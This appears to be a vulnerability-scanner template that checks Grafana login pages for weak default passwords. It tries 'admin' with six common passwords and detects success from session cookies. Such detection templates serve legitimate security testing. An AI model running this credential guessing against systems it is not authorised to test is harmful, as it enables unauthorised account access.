id: poc-yaml-grafana-weak-password
info:
  name: Grafana 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: Grafana
  osprey-id: vb_2019_0024
variables:
  r_usernames: admin
  r_passwords: 'admin

    123456

    1

    123

    password

    admin123'
  r_paths: '/login

    /grafana/login'
requests:
- method: GET
  path: '{{.r_paths}}'
  expression: status_code == 200 && contains(body, "grafana")
- method: POST
  path: '{{.r_paths}}'
  headers:
    Content-Type: application/json
  data: '{"user":"{{.r_usernames}}","password":"{{.r_passwords}}"}'
  expression: "status_code == 200 && contains(headers, \"Set-Cookie\") &&\n(\n  contains(headers,\
    \ \"grafana_user=\"+r_usernames) ||\n  ( contains(headers, \"grafana_session\"\
    ) &&  contains(body, \"\\\"message\\\"\"))\n)\n"
transport: http
